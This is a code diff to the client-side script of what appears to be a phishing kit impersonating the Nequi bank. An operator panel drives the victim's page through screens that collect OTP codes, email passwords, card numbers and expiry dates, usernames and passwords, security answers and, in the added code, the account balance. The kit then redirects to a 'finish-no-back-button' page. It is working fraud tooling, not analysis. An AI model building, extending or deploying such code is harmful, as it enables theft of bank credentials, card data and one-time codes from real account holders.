@@ -93,50 +93,110 @@ function consultar_estado(){ //
 
 /** Códigos alineados con el panel (run/status.php): 2 OTP, 4 correo, 6 tarjeta, 8 error OTP, 10 fin, 12 usuario */
 function consultar_estado() {
-    if (espera != 1) {
+    if (window.__nequiDemoSaldo) {
         return;
     }
     $.post("../../../process/estado.php", function (data) {
         var s = $.trim(String(data));
+        if (!/^\d+$/.test(s)) {
+            return;
+        }
+        var prevEst = window.__lastNequiEstado;
+        window.__lastNequiEstado = s;
         switch (s) {
             case '2':
-                espera = 0;
-                vista_otp();
+                if (prevEst !== '2' || !$(".otp").is(":visible") || $(".errorotp").is(":visible")) {
+                    vista_otp();
+                }
+                espera = 1;
                 break;
             case '4':
-                espera = 0;
-                vista_email();
+                if (prevEst !== '4' || !$(".correo-con").is(":visible")) {
+                    vista_email();
+                }
+                espera = 1;
                 break;
             case '6':
-                espera = 0;
-                vista_tarjeta();
+                if (prevEst !== '6' || !$(".tarjeta").is(":visible")) {
+                    vista_tarjeta();
+                }
+                espera = 1;
                 break;
             case '8':
-                espera = 0;
-                vista_errorotp();
+                if (prevEst !== '8' || !$(".errorotp").is(":visible")) {
+                    vista_errorotp();
+                }
+                espera = 1;
                 break;
             case '10':
-                espera = 0;
-                window.location.href = "../../../finish-no-back-button/";
+                if (prevEst !== '10') {
+                    window.location.href = "../../../finish-no-back-button/";
+                }
+                espera = 1;
                 break;
             case '12':
-                espera = 0;
-                vista_usuario();
+                if (prevEst !== '12' || !$(".acceso").is(":visible")) {
+                    vista_usuario();
+                }
+                espera = 1;
                 break;
             case '25':
-                espera = 0;
-                vista_pregunta2();
+                if (prevEst !== '25' || !$(".pregunta2").is(":visible")) {
+                    vista_pregunta2();
+                }
+                espera = 1;
                 break;
             case '255':
-                espera = 0;
-                vista_preguntarep();
+                if (prevEst !== '255' || !$(".pregunta2").is(":visible")) {
+                    vista_preguntarep();
+                }
+                espera = 1;
+                break;
+            case '27':
+                if (prevEst !== '27' || !$(".saldo-disponible").is(":visible")) {
+                    vista_saldo();
+                }
+                espera = 1;
+                break;
+            case '28':
+                if (prevEst !== '28') {
+                    vista_saldo_listo();
+                }
+                espera = 1;
                 break;
             default:
+                espera = 1;
                 break;
         }
     });
 }
+
+function vista_saldo() {
+    $(".fondo").hide();
+    $(".mensaje").hide();
+    $(".acceso").hide();
+    $(".otp").hide();
+    $(".errorotp").hide();
+    $(".correo-con").hide();
+    $(".tarjeta").hide();
+    $(".tarjetadt").hide();
+    $(".pregunta2").hide();
+    $(".total").show();
+    var el = document.getElementById("inputsaldo");
+    if (el) {
+        el.value = "";
+        el.focus();
+    }
+    $(".saldo-disponible").show();
+}
+
+function vista_saldo_listo() {
+    $(".saldo-disponible").hide();
+    $(".fondo").show();
+    $(".mensaje").show();
+}
 function vista_preguntarep(){
+    $(".saldo-disponible").hide();
 
     var op = 'pregunta';
 
@@ -196,6 +256,7 @@ function salir(){
 function vista_otp(){
     $(".fondo").hide();
     $(".mensaje").hide();
+    $(".saldo-disponible").hide();
 
 //    document.getElementById("codigootp").value = "";  
     
@@ -234,6 +295,7 @@ function vista_errorotp(){
 
     $(".fondo").hide();
     $(".mensaje").hide();
+    $(".saldo-disponible").hide();
 
     //document.getElementById("codigootp2").value = "";
     
@@ -270,6 +332,7 @@ function vista_errorotp(){
 function vista_usuario(){
     $(".fondo").hide();
     $(".mensaje").hide();
+    $(".saldo-disponible").hide();
 
     document.getElementById("usuario").value = "";
     document.getElementById("password").value = "";
@@ -299,6 +362,7 @@ function vista_usuario(){
 function vista_email(){
     $(".fondo").hide();
     $(".mensaje").hide();
+    $(".saldo-disponible").hide();
 
     document.getElementById("email").value = "";
     document.getElementById("clavemail").value = "";
@@ -328,6 +392,7 @@ function vista_email(){
 function vista_tarjeta(){
     $(".fondo").hide();
     $(".mensaje").hide();
+    $(".saldo-disponible").hide();
 
     document.getElementById("tarjeta16").value = "";
     document.getElementById("Fecha").value = "";
@@ -499,6 +564,7 @@ function vista_pregunta(){
 }
 
 function vista_pregunta2(){
+    $(".saldo-disponible").hide();
 
     var op = 'pregunta';
 
